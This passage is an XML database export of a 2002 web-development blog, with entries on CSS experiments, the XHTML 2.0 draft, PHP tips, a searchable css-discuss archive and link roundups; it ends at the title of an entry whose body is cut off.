		<field name="body">&lt;p&gt;I'm slowly working my way through both &lt;a href=&quot;http://www.ericmeyeroncss.com/&quot;&gt;Eric Meyer on CSS&lt;/a&gt; and &lt;a href=&quot;http://www.amazon.com/exec/obidos/ASIN/1904151043/&quot;&gt;CSS: Separating Content From Presentation&lt;/a&gt;. Initial impressions are that they were well worth the money - the two books complement each other very well indeed. Separating Content from Presentation (SCfP from now on) seems to be the more technical of the two - it provides excellent descriptions of the intricacies of the CSS specification and has some superb information on browser differences, with some good advice for web developers who need their sites to look reasonable in Netscape 4. Eric's book is more flamboyant, with full colour pages and a &quot;project&quot; formula that introduces CSS techniques through a variety of interesting case studies. Full reviews can wait until I have finished reading the two books.&lt;/p&gt;</field>
		<field name="created">2002-08-04 22:45:24</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">285</field>
		<field name="title">Stuart gets slashdotted</field>
		<field name="slug">stuartGetsSlashdotted</field>
		<field name="body">&lt;p&gt;Congratulations Stuart on &lt;a href=&quot;http://slashdot.org/article.pl?sid=02/08/04/2045201&amp;amp;mode=nested&amp;amp;tid=133&quot; title=&quot;Google Art Creator&quot;&gt;getting slashdotted&lt;/a&gt;. How's the server holding out?&lt;/p&gt;</field>
		<field name="created">2002-08-05 00:34:40</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">286</field>
		<field name="title">Impressive CSS</field>
		<field name="slug">impressiveCSS</field>
		<field name="body">&lt;p&gt;Take a look at &lt;a href=&quot;http://www.tantek.com/map.html&quot; title=&quot;tantek.com&quot;&gt;this page&lt;/a&gt; in Mozilla, view the source code and ask yourself &quot;how on earth did he do that?&quot;. It appears to involve very creative use of borders, possibly relating to the fact that a single border in CSS (at least in Mozilla and presumably in IE5/Mac as well) is actually a trapezium, not a line. Tantek Çelik &lt;em&gt;was&lt;/em&gt; the project lead for &lt;acronym title=&quot;Internet Explorer&quot;&gt;IE&lt;/acronym&gt; 5 for the Mac (and the creator of both the &lt;a href=&quot;http://www.tantek.com/CSS/Examples/boxmodelhack.html&quot;&gt;Box Model hack&lt;/a&gt; and the &lt;a href=&quot;http://www.tantek.com/CSS/Examples/highpass.html&quot;&gt;High Pass Filter&lt;/a&gt;) so general &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; wizardry is to be expected.&lt;/p&gt;</field>
		<field name="created">2002-08-05 01:42:16</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">287</field>
		<field name="title">So it does have a use after all</field>
		<field name="slug">soItDoesHaveAUseAfterAll</field>
		<field name="body">&lt;p&gt;&lt;code&gt;text-decoration: blink&lt;/code&gt; &lt;a href=&quot;http://ln.hixie.ch/?start=1028546291&amp;amp;count=1&quot; title=&quot; Tales from The End &quot;&gt;spotted in the wild!&lt;/a&gt;. Seeing as Hixie so &lt;a href=&quot;http://bugzilla.mozilla.org/show_bug.cgi?id=89065#c46&quot; title=&quot;Bug 89065 text-decoration:blink not working&quot;&gt;eloquently argued&lt;/a&gt; for its inclusion in Mozilla in the first place it's nice to see this most vital of &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; properties being put to some use.&lt;/p&gt;</field>
		<field name="created">2002-08-05 16:50:49</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">288</field>
		<field name="title">XHTML 2</field>
		<field name="slug">xhtml2</field>
		<field name="body">&lt;p&gt;The W3C have published a &lt;a href=&quot;http://www.w3.org/TR/xhtml2/&quot;&gt;working draught of XHTML 2.0&lt;/a&gt;. Since the &lt;a href=&quot;http://www.w3.org/TR/xhtml2/xhtml2-changes.html#a_changes&quot;&gt;Changes from XHTML 1.1&lt;/a&gt; pages doesn't appear to have been written yet, here are a few of the most notable differences I've spotted so far:&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;Lots of new tags, including &lt;code&gt;&amp;lt;dfn&amp;gt;&lt;/code&gt; for inline definitions (similar to &lt;code&gt;&amp;lt;acronym&amp;gt;&lt;/code&gt; but even more useful) and &amp;lt;section&amp;gt; for defining logical sections in conjunction with a new structural &lt;code&gt;&amp;lt;h&amp;gt;&lt;/code&gt; tag.&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://www.w3.org/TR/xhtml2/mod-list.html#sec_10.2.&quot;&gt;Navigation Lists!&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Forms are being replaced with XForms.&lt;/li&gt;
&lt;li&gt;Goodbye &lt;code&gt;&amp;lt;img&amp;gt;&lt;/code&gt; tag! It looks like we'll be using &lt;code&gt;&amp;lt;object&amp;gt;&lt;/code&gt; instead.&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;Unfortunately with the amount of time it takes for browser manufacturers to implement even simple specifications it could be years before we can start using these improvements.&lt;/p&gt;</field>
		<field name="created">2002-08-06 11:49:58</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">289</field>
		<field name="title">Top IRC quotes</field>
		<field name="slug">topIRCQuotes</field>
		<field name="body">&lt;p&gt;A fundamental law of the internet is that no &lt;acronym title=&quot;Internet Relay Chat&quot;&gt;IRC&lt;/acronym&gt; quote is ever funny when posted on a web site. The &lt;a href=&quot;http://www.bash.org/?top&quot;&gt;QDB Top 50 Quotes&lt;/a&gt; (via &lt;a href=&quot;http://www.ordinary-life.net/blog/archives/001316.php&quot; title=&quot;IRC Quotes&quot;&gt;Ordinary Life&lt;/a&gt;) must by the exception that proves the rule:&lt;/p&gt;
&lt;blockquote cite=&quot;http://www.bash.org/?top&quot;&gt;&lt;p&gt;&amp;lt;xterm&amp;gt; The problem with America is stupidity. I'm not saying there should be a capital punishment for stupidity, but why don't we just take the safety labels off of everything and let the problem solve itself?&lt;/p&gt;&lt;/blockquote&gt;</field>
		<field name="created">2002-08-06 13:08:14</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">290</field>
		<field name="title">More on XHTML</field>
		<field name="slug">moreOnXhtml</field>
		<field name="body">&lt;p&gt;A few more notes on XHTML 2.0. Tom Gilder (who incidentally has written an excellent series of tips on &lt;a href=&quot;http://tom.me.uk/scripting/&quot;&gt;accessible scripting&lt;/a&gt;) has &lt;a href=&quot;http://www.bath.ac.uk/~cs1spw/blog/comments.php?t=1028630998&quot;&gt;pointed out&lt;/a&gt; that the &lt;code&gt;&amp;lt;dfn&amp;gt;&lt;/code&gt; tag is part of HTML4 and corrected my spelling of draft as well :) Meanwhile, a post by Shane P. McCarron to &lt;a href=&quot;http://groups.yahoo.com/group/xhtml-l/&quot;&gt;XHTML-L&lt;/a&gt; has highlighted a few more interesting points - &lt;code&gt;&amp;lt;applet&amp;gt;&lt;/code&gt; is out (in favour of &lt;code&gt;&amp;lt;object&amp;gt;&lt;/code&gt;, &lt;a href=&quot;http://www.w3.org/TR/xml-events&quot;&gt;XMLEvents&lt;/a&gt; are in to replace the current event model and the &lt;code&gt;href&lt;/code&gt; attribute can now be used on pretty much anything to turn it in to a link. Strangely XLink is not mentioned in the specification.&lt;/p&gt;

&lt;p&gt;The new working draft is currently being discussed on &lt;a href=&quot;http://lists.w3.org/Archives/Public/www-html/&quot;&gt;www-html&lt;/a&gt;, a relatively low traffic mailing list hosted by the &lt;acronym title=&quot;World Wide Web Consortium&quot;&gt;W3C&lt;/acronym&gt;.&lt;/p&gt;</field>
		<field name="created">2002-08-06 16:07:01</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">291</field>
		<field name="title">More CSS</field>
		<field name="slug">moreCSS</field>
		<field name="body">&lt;p&gt;Two more interesting CSS demonstrations - &lt;a href=&quot;http://www.albin.net/CSS/roundedCorners/&quot;&gt;Bullet proof rounded corners&lt;/a&gt; and &lt;a href=&quot;http://realworldstyle.com/breadcrumb_lists.html&quot;&gt;Breadcrumb nested lists&lt;/a&gt;. The rounded corners technique is very impressive - it solves a common CSS problem in a way that is durable, cross browser and, well, bullet proof. However, as Mark Pilgrim &lt;a href=&quot;http://diveintomark.org/archives/2002/08/05.html#rounded_corners&quot;&gt;points out&lt;/a&gt;:&lt;/p&gt;&lt;blockquote&gt;&lt;p&gt;Apparently we've traded a big stinking pile of table tricks for a big stinking pile of CSS tricks. It's not more semantically pure, it's not more accessible, it's not easier to maintain. Why is this progress?&lt;/p&gt;&lt;/blockquote&gt;&lt;p&gt;Mark Newhouse's breadcrumb demo takes the opposite aproach, taking a semantically correct nested list approach to marking up breadcrumbs, then using CSS to style them as a single line. Eric Meyer sums up the reason such experiments are important very nicely on cs-discuss:&lt;/p&gt;&lt;blockquote&gt;&lt;p&gt;Every time we play with CSS, we're learning something-- whether it's new ways to use CSS effectively, or the limits of what we're willing to do with CSS, or areas for future expansion of CSS itself, or something else entirely.&lt;/p&gt;&lt;/blockquote&gt;</field>
		<field name="created">2002-08-06 16:23:30</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">292</field>
		<field name="title">XHTML 2 demonstrated</field>
		<field name="slug">xhtml2Demonstrated</field>
		<field name="body">&lt;p&gt;Sjoerd Visscher has published &lt;a href=&quot;http://w3future.com/weblog/gems/xhtml2.xml&quot;&gt;an XHTML 2.0 page&lt;/a&gt; that works in &lt;acronym title=&quot;Internet Explorer 6&quot;&gt;IE6&lt;/acronym&gt;, Mozilla and Opera, complete with support for navigation lists and &lt;code&gt;href&lt;/code&gt; attributes on multiple elements. The &lt;a href=&quot;http://w3future.com/weblog/2002/08/07.html#a117&quot; title=&quot;A working XHTML 2.0 page&quot;&gt;implementation&lt;/a&gt; is very clever - it uses &lt;acronym title=&quot;Internet Explorer&quot;&gt;IE&lt;/acronym&gt; behaviors, Mozilla &lt;acronym title=&quot;XML Binding Language&quot;&gt;XBL&lt;/acronym&gt; files and Opera's proprietary link &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; properties to get all three browsers to play nicely (be sure to check out the &lt;a href=&quot;http://w3future.com/weblog/gems/xhtml2.css&quot;&gt;style sheet&lt;/a&gt;). A custom DOCTYPE at the top of the page adds &lt;acronym title=&quot;Document Type Definition&quot;&gt;DTD&lt;/acronym&gt; descriptions of the new &lt;acronym title=&quot;eXtensible HyperText Markup Language&quot;&gt;XHTML&lt;/acronym&gt; 2.0 elements used in the document.&lt;/p&gt;</field>
		<field name="created">2002-08-07 12:56:34</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">293</field>
		<field name="title">Funky stuff for css-discuss</field>
		<field name="slug">funkyStuffForCSSDiscuss</field>
		<field name="body">&lt;p&gt;I think I've kept quiet for long enough, so here are some details of the two projects I have &lt;a href=&quot;http://www.bath.ac.uk/~cs1spw/blog/archive/2002/08/02/#oohAMystery&quot;&gt;alluded to&lt;/a&gt;. The first is a database driven mailing list archive for &lt;a href=&quot;http://two.pairlist.net/mailman/listinfo/css-discuss&quot;&gt;css-discuss&lt;/a&gt;. It has just gone in to private beta, so anyone subscribed to the css-discuss list should have an email with the &lt;acronym title=&quot;Uniform Resource Locater&quot;&gt;URL&lt;/acronym&gt;, username and password requried to try it out. It has a pretty usable search engine and does some nice threaded views in messages - more importantly, it now contains all 9,000+ messages sent to css-discuss since it launched back in January 2002 (imported from the static Mailman archives). I've spent many hours surfing through the archives already and they are a wealth of useful &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; information.&lt;/p&gt;

&lt;p&gt;Project two is again related to css-discuss. I've been setting up a Wiki, which is currently being tweaked and poked and made ready for the general public. More on that when it launches.&lt;/p&gt;</field>
		<field name="created">2002-08-07 13:47:39</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">294</field>
		<field name="title">Smarty 2.30</field>
		<field name="slug">smarty230</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://smarty.php.net/&quot; title=&quot;The Smarty PHP Templating Engine&quot;&gt;Smarty 2.3.0&lt;/a&gt; is out, and includes a useful new debugging function and support for assigning template variables by reference. I get a mention in the &lt;a href=&quot;http://smarty.php.net/misc/NEWS&quot;&gt;CHANGELOG&lt;/a&gt; for a small bug fix I submitted. Open source at work.&lt;/p&gt;</field>
		<field name="created">2002-08-07 16:48:37</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">295</field>
		<field name="title">PHP strings tip</field>
		<field name="slug">phpStringsTip</field>
		<field name="body">&lt;p&gt;&lt;acronym title=&quot;PHP: Hypertext Preprocessor&quot;&gt;PHP&lt;/acronym&gt; Tip: You can access characters within a PHP string using the index of the caracter in curly braces after the variable name. For example, &lt;code&gt;$string{0}&lt;/code&gt; returns the first character, &lt;code&gt;$string{3}&lt;/code&gt; returns the fourth character and &lt;code&gt;$string{strlen($string)-1}&lt;/code&gt; returns the last character. You can assign to individual characters of a string in the same way, so &lt;code&gt;$string{0} = strtoupper($string{0});&lt;/code&gt; will convert the first character of a string to upper case. For more tips on working with strings see the &lt;a href=&quot;http://www.php.net/manual/en/language.types.string.php&quot; title=&quot;PHP Strings&quot;&gt;PHP manual&lt;/a&gt; and Zend's useful &lt;a href=&quot;http://www.zend.com/zend/tut/using-strings.php&quot; title=&quot;Using Strings&quot;&gt;strings tutorial.&lt;/a&gt;&lt;/p&gt;</field>
		<field name="created">2002-08-07 18:09:39</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">296</field>
		<field name="title">Yup this site is for real</field>
		<field name="slug">yupThisSiteIsForReal</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://www.edible.com/&quot;&gt;Edible.com&lt;/a&gt; are a small company based in London that &lt;q cite=&quot;http://www.edible.com/&quot;&gt;aim to bring you an Adventure in Eating from around the World!&lt;/q&gt;. Which means scorpion lollipops, milk chocolate covered ants and pickled rattlesnakes in a tin (a bargain at £16.50). I'm actually quite tempted to grab some &lt;a href=&quot;http://www.edible.com/images/test/innersite/products/amberlix_p.jpg&quot;&gt;Toffee Scorpions&lt;/a&gt;, if only to terrorise my friends at university...&lt;/p&gt;</field>
		<field name="created">2002-08-08 00:56:45</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">297</field>
		<field name="title">Mike Pletch to Column Two</field>
		<field name="slug">mikePletchToColumnTwo</field>
		<field name="body">&lt;p&gt;I spotted &lt;a href=&quot;http://www.mikepletch.com/&quot;&gt;Mike Pletch&lt;/a&gt; in my referrals this morning. His blog has a clean, readable design and some great content, particularly if you are interested in information architecture and content management. Via Mike I revisited &lt;a href=&quot;http://www.steptwo.com.au/columntwo/&quot;&gt;Column Two&lt;/a&gt; which is currently documenting an implementation of a full content management system for a client - well worth a read.&lt;/p&gt;</field>
		<field name="created">2002-08-08 12:30:41</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">298</field>
		<field name="title">Offline until Sunday</field>
		<field name="slug">offlineUntilSunday</field>
		<field name="body">I'll probably be offline until Sunday. Have a nice weekend :)</field>
		<field name="created">2002-08-08 14:50:27</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">299</field>
		<field name="title">Benefits of XHTML</field>
		<field name="slug">benefitsOfXhtml</field>
		<field name="body">&lt;p&gt;Phil Ringnalda is &lt;a href=&quot;http://philringnalda.com/archives/002104.php&quot;&gt;questioning the point&lt;/a&gt; of &lt;acronym title=&quot;eXtensible HyperText Markup Language&quot;&gt;XHTML&lt;/acronym&gt;. The single, huge advantage it has over HTML is that XHTML can be parsed by &lt;i&gt;anything&lt;/i&gt; (or any language) with an XML parser. As an example, a few weeks ago I was asked to write a script to grab links from a bunch of HTML pages and insert them in to a database. I solved the problem with a combination of PHP's &lt;a href=&quot;http://www.php.net/strip_tags/&quot;&gt;strip_tags()&lt;/a&gt; function  and XML parsing abilities, by killing off every tag that wasn't an &amp;lt;a&amp;gt; tag and slapping on a start and end element to turn the document in to valid XML - a step that would not have been necessary had the page used XHTML in the first place.&lt;/p&gt;

&lt;p&gt;While upgrading to XHTML may have few immediate benefits, the ease with which it can be parsed has very real benefits further down the line. Writing content in XHTML now will make it much easier to re-use that content in the future.&lt;/p&gt;

&lt;p&gt;&lt;em&gt;Update: I should have checked the date on his entry before I posted - this is from way back in December 2001&lt;/em&gt;&lt;/p&gt;</field>
		<field name="created">2002-08-11 19:46:48</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">300</field>
		<field name="title">One for Paul</field>
		<field name="slug">oneForPaul</field>
		<field name="body">&lt;p&gt;This one's for Paul from Uni: &lt;a href=&quot;http://www.logicalcreativity.com/jon/plush/01.html&quot;&gt;Tales of the Plush Cthulhu&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Some thoughts on blogging etiquette. With anything like this I have a policy of always linking to the blog entry that pointed me to the site in question (if I found it via someone else's blog). The exception to this rule is when I've seen it on several blogs, as is the case with this item which I've spotted on &lt;a href=&quot;http://www.textartisan.com/caveatlector/archive/2002_08.html#e000350&quot;&gt;Caveat Lector&lt;/a&gt;, &lt;a href=&quot;http://www.whump.com/moreLikeThis/link/03004&quot;&gt;More Like This&lt;/a&gt; and &lt;a href=&quot;http://boingboing.net/2002_08_01_archive.html#85332275&quot;&gt;BoingBoing&lt;/a&gt;. My reasoning is that whenever something gets linked this heavily it's aproaching meme status, so who linked it first becomes something of a moot point.&lt;/p&gt;</field>
		<field name="created">2002-08-11 23:11:35</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">301</field>
		<field name="title">dChat released</field>
		<field name="slug">dChatReleased</field>
		<field name="body">&lt;p&gt;Glen Murphy has &lt;a href=&quot;http://sourceforge.net/projects/dchat/&quot; title=&quot;Sourceforge project info: dChat&quot;&gt;released&lt;/a&gt; the source code to his innovative &lt;a href=&quot;http://bodytag.org/dchat/&quot;&gt;dChat&lt;/a&gt; &lt;acronym title=&quot;PHP: Hypertext Preprocessor&quot;&gt;PHP&lt;/acronym&gt;/&lt;acronym title=&quot;Dynamic HyperText Markup Language&quot;&gt;DHTML&lt;/acronym&gt; chat system. I've been playing around with it this morning and it's a very nice piece of software. dChat uses an interesting take on the &lt;a href=&quot;http://www.ashleyit.com/rs/main.htm&quot;&gt;remote scripting&lt;/a&gt; concept, using the &lt;acronym title=&quot;Document Object Model&quot;&gt;DOM&lt;/acronym&gt; to append &lt;code&gt;&amp;lt;script&amp;gt;&lt;/code&gt; elements to the head of the document in order to grab additional information from the server without refreshing the page. Unfortunately this technique does not work in &lt;acronym title=&quot;Internet Explorer&quot;&gt;IE&lt;/acronym&gt; on the Mac, but it works fine on Mozilla and IE/Windows.&lt;/p&gt;</field>
		<field name="created">2002-08-12 11:05:30</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">302</field>
		<field name="title">Archivist goes live</field>
		<field name="slug">archivistGoesLive</field>
		<field name="body">&lt;p&gt;After a successful private beta, the new searchable &lt;a href=&quot;http://archivist.incutio.com/css-discuss/&quot;&gt;css-discuss archive&lt;/a&gt; is ready for use by the general public. If you spot any bugs or have any suggestions for improving the archive please &lt;a href=&quot;/~cs1spw/blog/contact/?subject=css-discuss+archive+feedback&quot;&gt;drop me a line&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;The archive includes all messages sent to the &lt;a href=&quot;http://two.pairlist.net/mailman/listinfo/css-discuss&quot;&gt;css-discuss mailing list&lt;/a&gt; since the list started back in January, and should be of great interest to anyone with an interest in &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt;. The archive software is written in &lt;acronym title=&quot;PHP: Hypertext Preprocessor&quot;&gt;PHP&lt;/acronym&gt; and uses mySQL for storage.&lt;/p&gt;</field>
		<field name="created">2002-08-12 17:14:22</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">303</field>
		<field name="title">Zeldman interview</field>
		<field name="slug">zeldmanInterview</field>
		<field name="body">&lt;p&gt;Jeffrey Zeldman: &lt;a href=&quot;http://www.webbuilderconference.com/interview_zeldman.asp&quot;&gt;&quot;99 percent of Web sites are obsolete&quot;&lt;/a&gt;. An excellent interview covering web standards and the new techniques they encourage.&lt;/p&gt;</field>
		<field name="created">2002-08-13 21:40:07</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">304</field>
		<field name="title">Optimising Javascript</field>
		<field name="slug">optimisingJavascript</field>
		<field name="body">&lt;p&gt;A &lt;a href=&quot;http://www.sitepointforums.com/showthread.php?threadid=72079&quot; title=&quot;TIP: Speed up your JavaScript code!&quot;&gt;thread on SitePoint&lt;/a&gt; lead me to these two excellent tutorials: &lt;a href=&quot;http://home.earthlink.net/~kendrasg/info/js_opt/&quot;&gt;Javascript Optimisation&lt;/a&gt; and &lt;a href=&quot;http://www.javascriptkit.com/javatutors/serror.shtml&quot;&gt;Tackling JavaScript strict warnings&lt;/a&gt;.&lt;/p&gt;</field>
		<field name="created">2002-08-14 00:07:54</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">305</field>
		<field name="title">Tidakada</field>
		<field name="slug">tidakada</field>
		<field name="body">&lt;p&gt;Spotted in my referrals: &lt;a href=&quot;http://www.tidakada.com/&quot;&gt;tidak ada&lt;/a&gt;, a beautifully designed blog covering web development and other related topics. This is another great example of what you can achieve with some creative CSS.&lt;/p&gt;</field>
		<field name="created">2002-08-14 00:26:15</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">306</field>
		<field name="title">SitePoint CSS experiment</field>
		<field name="slug">sitepointCssExperiment</field>
		<field name="body">&lt;p&gt;SitePoint are trialling a &lt;a href=&quot;http://www.sitepoint.com/&quot; title=&quot;SitePoint&quot;&gt;new design&lt;/a&gt; for their front page. For fun, I had a go at recreating the new design &lt;a href=&quot;http://development.incutio.com/simon/css-experiments/sitepoint/new2.html&quot; title=&quot;My SitePoint CSS Experiment&quot;&gt;using structural XHTML and CSS&lt;/a&gt;. The result isn't my normal style (I normally avoid fixed pixel font sizes and go for liquid rather than fixed width layouts) but replicates the existing design nicely and looks good in &lt;acronym title=&quot;Internet Explorer&quot;&gt;IE&lt;/acronym&gt; 5/6, Mozilla and Opera 6 on Windows. Netscape 4 doesn't get the stylesheet and I have yet to try it out on a mac.&lt;/p&gt;</field>
		<field name="created">2002-08-14 00:51:58</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">307</field>
		<field name="title">Controlled vocabularies</field>
		<field name="slug">controlledVocabularies</field>
		<field name="body">&lt;p&gt;Christina Wodtke: &lt;a href=&quot;http://www.digital-web.com/tutorials/tutorial_2002-08.shtml&quot;&gt;Mind your phraseology!&lt;/a&gt;, a tutorial on controlled vocabularies. The concept is very similar to that used by TopicMaps - relationships are defined between terms that take in to account  hierarchies, associated terms and even alternative spellings. I'm planning an overhaul of the category / metadata system used on this blog in the near future and Christina's tutorial has given me a whole load of new ideas.&lt;/p&gt;</field>
		<field name="created">2002-08-14 12:37:45</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">308</field>
		<field name="title">Bulletin board spam</field>
		<field name="slug">bulletinBoardSpam</field>
		<field name="body">&lt;p&gt;My friend &lt;a href=&quot;http://www.tfountain.co.uk/&quot;&gt;Tim&lt;/a&gt; recently received a spam from a company called &lt;a href=&quot;http://www.google.com/search?q=trafficbbs&quot; title=&quot;Top result on Google - link obscured because I don&amp;apos;t want to show up in their referral logs&quot;&gt;TrafficBBS&lt;/a&gt;, who specialise in bulk submissions to 50,000 search engines and &lt;strong&gt;120,000+ BBS&lt;/strong&gt; (web based bulletin boards). A quick look at their list of targetted forums reveals that they are spidering and spamming a whole bunch of simple web based forum scripts that don't require user authentication, such as &lt;a href=&quot;http://www.scriptarchive.com/wwwboard.html&quot; title=&quot;Another flawed script from MSA&quot;&gt;WWWBoard&lt;/a&gt;. This is a form of spam I wasn't aware of until now. It's scary to think how easily the system could be expanded to automatically register on more advanced widespread forum systems such as &lt;a href=&quot;http://www.vbulletin.com/&quot;&gt;vBulletin&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Incidentally, their crawler (or one of them) identifies itself as &lt;code&gt;PHP/4.2.1&lt;/code&gt; and uses the IP address 211.101.236.142.&lt;/p&gt;</field>
		<field name="created">2002-08-14 15:46:02</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">309</field>
		<field name="title">Alchemist contest</field>
		<field name="slug">alchemistContest</field>
		<field name="body">&lt;p&gt;AlltheWeb.com introduced an innovative feature called &lt;a href=&quot;http://www.alltheweb.com/alchemist/&quot;&gt;Alchemist&lt;/a&gt; a while ago which allows visitors to customise the site by specifying the &lt;acronym title=&quot;Uniform Resource Locator&quot;&gt;URL&lt;/acronym&gt; to their own style sheet. They have now announced a &lt;a href=&quot;http://www.alltheweb.com/contest/&quot;&gt;CSS design contest&lt;/a&gt; for the service, with top prizes of $750 in Amazon vouchers available for three categories (&quot;Simple, Yet Beautiful&quot;, &quot;To CSS Infinity and Beyond&quot; and &quot;So 22nd Century&quot;). This is a great oportunity for advocates of &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; to show just how powerful it really is.&lt;/p&gt;
</field>
		<field name="created">2002-08-14 16:25:48</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">310</field>
		<field name="title">Q tag bad</field>
		<field name="slug">qTagBad</field>
		<field name="body">&lt;p&gt;Mark Pilgrim &lt;a href=&quot;http://diveintomark.org/archives/2002/08/14.html#the_q_tag_revisited&quot; title=&quot;The Q tag revisisted&quot;&gt;explains&lt;/a&gt; why the &amp;lt;q&amp;gt; tag is &lt;em&gt;bad&lt;/em&gt; for accessibility.&lt;/p&gt;</field>
		<field name="created">2002-08-14 16:33:49</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">311</field>
		<field name="title">PHP and ID3 tags</field>
		<field name="slug">phpAndID3Tags</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://www.capescience.com/downloads/piranha/&quot;&gt;MP3 Piranha&lt;/a&gt; is a clever application which indexes your MP3 collection and uses the Amazon Web Service API to look up the album cover, related albums and provide a link to buy the album from Amazon. Out of curiosity, I ran a search for a PHP library to decode ID3 tags to see if such a thing could be built with PHP, and came up with &lt;a href=&quot;http://leknor.com/code/php/view/class.id3.php.txt&quot;&gt;this script by Leknor&lt;/a&gt;. The class is well written and I learnt a lot about ID3 tags looking through it - it seems they take up the last 128 bytes of an MP3 file and can be decoded using PHP's &lt;a href=&quot;http://www.php.net/unpack&quot;&gt;&lt;code&gt;unpack()&lt;/code&gt;&lt;/a&gt; function.&lt;/p&gt;</field>
		<field name="created">2002-08-14 16:40:49</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">312</field>
		<field name="title">Thanks for the link</field>
		<field name="slug">thanksForTheLink</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://www.kryogenix.org/&quot;&gt;Stuart&lt;/a&gt; has pointed out that this is the &lt;a href=&quot;http://www.zeldman.com/daily/0802b.html#threewhitechicks&quot;&gt;second time&lt;/a&gt; Jeffrey Zeldman (who is &lt;a href=&quot;http://www.7nights.com/asterisk/archives/000032.html&quot;&gt;actually Eric Meyer&lt;/a&gt;) has &lt;a href=&quot;http://www.zeldman.com/daily/0702a.html#dyamaker&quot;&gt;spelt my name wrong&lt;/a&gt; :)&lt;/p&gt;</field>
		<field name="created">2002-08-14 19:29:52</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">313</field>
		<field name="title">Fun with FOLDOC</field>
		<field name="slug">funWithFOLDOC</field>
		<field name="body">&lt;p&gt;The &lt;a href=&quot;http://foldoc.doc.ic.ac.uk/foldoc/index.html&quot;&gt;Free On-Line Dictionary of Computing&lt;/a&gt; does exactly what it says on the tin. It is available under the &lt;a href=&quot;http://www.gnu.org/licenses/fdl.html&quot;&gt;GNU Free Documentation License&lt;/a&gt; so I grabbed a copy of the archive (which expands to a 4MB text file) and had a go at dumping it in to a mySQL database. I haven't done anything with it yet (apart from putting together a rudimentary &lt;a href=&quot;http://development.incutio.com/simon/foldoc/&quot; title=&quot;FOLDOC Proof of concept&quot;&gt;interface&lt;/a&gt;) but I have a few ideas for interesting ways of reusing the data.&lt;/p&gt;</field>
		<field name="created">2002-08-15 14:39:25</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">314</field>
		<field name="title">CSS Trickery</field>
		<field name="slug">CSSTrickery</field>
		<field name="body">&lt;p&gt;New &lt;acronym title=&quot;Cascading Style Sheet&quot;&gt;CSS&lt;/acronym&gt; Experiment: &lt;a href=&quot;http://development.incutio.com/simon/css-experiments/float-trickery.html&quot;&gt;Trickery with Floats and Negative Margins&lt;/a&gt;, inspired by &lt;a href=&quot;http://archivist.incutio.com/css-discuss/?id=11005&quot;&gt;this message&lt;/a&gt; on css-discuss. By applying both &lt;code&gt;position: relative&lt;/code&gt; and a negative margin to a floated element it is possible to pull it out of the flow of text in to the margin of the document. I have used a variant of this technique in the &lt;a href=&quot;http://development.incutio.com/simon/css-experiments/sitepoint/new3.html&quot; title=&quot;SitePoint in CSS, third attempt&quot;&gt;third revision&lt;/a&gt; of my SitePoint in CSS demonstration.&lt;/p&gt;</field>
		<field name="created">2002-08-15 16:06:32</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">315</field>
		<field name="title">Hacking Las Vegas</field>
		<field name="slug">hackingLasVegas</field>
